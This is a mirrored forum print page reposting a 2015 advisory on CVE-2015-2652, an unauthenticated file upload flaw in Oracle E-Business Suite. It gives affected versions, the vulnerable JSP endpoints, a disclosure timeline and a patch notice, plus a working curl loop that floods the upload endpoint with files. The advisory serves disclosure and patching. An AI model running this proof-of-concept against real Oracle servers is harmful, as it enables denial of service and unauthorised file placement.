<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">

<!-- Mirrored from garage4hackers.com/printthread.php?t=6665&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 12:39:01 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
	<base  /><!--[if IE]></base><![endif]-->
	<meta name="generator" content="vBulletin 4.2.1" />

	
	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
	



	<title> CVE-2015-2652 – Unauthenticated File Upload in Oracle E-business Suite.</title>
	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />

</head>
<body>

<div class="above_body">
<div id="header" class="floatcontainer">
<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
</div>
</div>
<div class="body_wrapper">
<div id="pagetitle">
	<h1><a href="showthread5dae.html?t=6665">CVE-2015-2652 – Unauthenticated File Upload in Oracle E-business Suite.</a></h1>
	<p class="description">Printable View</p>
</div>



<ul id="postlist">
	<li class="postbit blockbody" id="post_1">
	<div class="header">
		<div class="datetime">07-15-2015, 12:21 PM</div>
		<span class="username">[s]</span>
	</div>
	
	
		<div class="title">CVE-2015-2652 – Unauthenticated File Upload in Oracle E-business Suite.</div>
	
	<div class="content">
		<blockquote class="restore">During my regular job, I unravelled an interesting vulnerability of Unauthenticated File Upload in Oracle E-business Suite 0-day vulnerability. This particular Upload Bug can be easily used to upload files on the web-server and also an attacker can flood the hard-disk of the server,thus making it easier for an attacker to leverage the vulnerability remotely.<br />
<br />
Oracle released Critical Patch Update containing security fixes for the Oracle E-Business Suite. This vulnerability is remotely exploitable without requiring any kind of authentication , i.e. exploited over the network without the need for any valid username credentials.<br />
<br />
<b>Introduction</b><br />
<br />
Oracle E-Business Suite is a fully integrated, comprehensive suite of business applications for the enterprise. Following purposes most of organization uses Oracle E-business.<br />
<br />
    Customer Relationship Management<br />
    Financial Management<br />
    Financial Management<br />
    Human Capital Management<br />
    Project Portfolio Management<br />
    Advanced Procurement<br />
    Supply Chain Management<br />
    Service Management<br />
<br />
<b>Vulnerable Version</b><br />
<br />
Oracle E-Business Suite, version(s) 11.5.10.2, 12.0.6, 12.1.1, 12.1.2, 12.1.3, 12.2.3, 12.2.4<br />
<br />
<b>Brief About bug</b><br />
<br />
The unauthenticated upload vulnerability resides in Oracle Marketing component.  If you search in Google for Oracle E-business, you will find more than 30K unique search results.<br />
<br />
The file is uploaded into a table in the E-Business Suite database schema.  The attacker,however, can use it to fill up the existing table space. Upload functionality allows the attacker to upload any arbitrary file types(All executables) and also allows to execute the uploaded code.<br />
<br />
POC Raw code for feeding files files to server to :<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">for ($x=1; $x &lt; 100; $x++):<br />
curl -i -s -k&nbsp; -X 'POST' \<br />
&nbsp; &nbsp; -H 'Origin: http://Oracle-Application:Port' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36' -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywS9xiTn7rP23Fori' -H 'Referer: http://Oracle-Application:Port/OA_HTML/amsImageSelect.jsp' \<br />
&nbsp; &nbsp; -b 'JSESSIONID=6e66b3f234234234272c18909d2bca0c96bf7c.kdsnfksjdfn34rk32; PROD_pses=PROD%3DHcqumhXKzuUX0xNEIjoeFKu8hZ%7E; PROD=HcqumhXKzuUX0xNEIjoeFKu8hZ; oracle.uix=0^^GMT+4:00^p' \<br />
&nbsp; &nbsp; --data-binary $'------WebKitFormBoundarywS9xiTn7rP23Fori\x0d\x0aContent-Disposition: form-data; name=\&quot;type\&quot;\x0d\x0a\x0d\x0aF\x0d\x0a------WebKitFormBoundarywS9xiTn7rP23Fori\x0d\x0aContent-Disposition: form-data; name=\&quot;FileInput\&quot;; filename=\&quot;Check.txt\&quot;\x0d\x0aContent-Type: text/plain\x0d\x0a\x0d\x0a\x0d\x0a------WebKitFormBoundarywS9xiTn7rP23Fori\x0d\x0aContent-Disposition: form-data; name=\&quot;fileId\&quot;\x0d\x0a\x0d\x0anull\x0d\x0a------WebKitFormBoundarywS9xiTn7rP23Fori\x0d\x0aContent-Disposition: form-data; name=\&quot;url\&quot;\x0d\x0a\x0d\x0a\x0d\x0a------WebKitFormBoundarywS9xiTn7rP23Fori--\x0d\x0a' \<br />
&nbsp; &nbsp; 'http://Oracle-Application:Port//OA_HTML/amsImageUpload.jsp?dummy=1&amp;jttst0=6_22646%2C22646%2C-1%2C0%2C&amp;jtfm0=&amp;etfm1=&amp;jfn=ZG01DFBB7BC079CDE282F4716CF2E5B140454CA599F18AD7A2CAD711D30D5FB60DF18438A1D10EB7BD7CF1370CF9D979BDA7&amp;oas=ddrqZePQ82zVbJrUIG7jrw..&amp;JSSetFunctionName=null&amp;elemName=null'<br />
end for;</code><hr />
</div><b>Vulnerability Information</b><br />
<br />
By using the following URLs the attacker can use it to upload files on the server.<br />
<br />
<a href="../external.html?link=http://oracle-webserver:port/OA_HTML/amsImageSelect.jsp" target="_blank">http://ORACLE-WebServer:Port/OA_HTML/amsImageSelect.jsp</a><br />
<a href="../external.html?link=http://oracle-webserver:port/OA_HTML/amsImageUpload.jsp" target="_blank">http://ORACLE-WebServer:Port/OA_HTML/amsImageUpload.jsp</a><br />
<br />
Oracle E-business-vulnerability<br />
<br />
For the security reasons we are not releasing uploaded file path.<br />
<br />
<b>Timeline</b><br />
<br />
May 7, 2015 :  Identification of the vulnerability<br />
May 8, 2015 :  Reported to the Oracle Security Team<br />
May 12, 2015: Confirmed Upload Vulnerability in Oracle E-business<br />
May 22, 2015 :Upload Vulnerability Patched<br />
May 22, 2015 : CPU Scheduled for Critical Update<br />
July 13, 2015 : CVE Allocated CVE-2015-2652<br />
July 14, 2015 : Critical Update Pushed<br />
July 15, 2015 : Vulnerability Made Public<br />
<br />
<b>Mitigation</b><br />
<br />
Update Oracle E-business Suit to latest version.<br />
<br />
Source: <a href="../external.html?link=http://blog.securelayer7.net/cve-2015-2652-unauthenticated-file-upload-in-oracle-e-business-suite/" target="_blank">http://blog.securelayer7.net/cve-201...usiness-suite/</a></blockquote>
	</div>
</li>
</ul>


</div>
<div class="below_body">
<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">04:10 PM</span>.</div>

<div id="footer_copyright" class="footer_copyright">
	<!-- Do not remove this copyright notice -->
	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
	<!-- Do not remove this copyright notice -->	
</div>
<div id="footer_morecopyright" class="footer_morecopyright">
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	Copyright 2010 - 2017, Garage4Hackers
</div>
 
</div>

<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try{
var pageTracker = _gat._getTracker('UA-17311051-3');
pageTracker._trackPageview();
} catch(err) {}</script>
</body>

<!-- Mirrored from garage4hackers.com/printthread.php?t=6665&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 12:39:01 GMT -->
</html>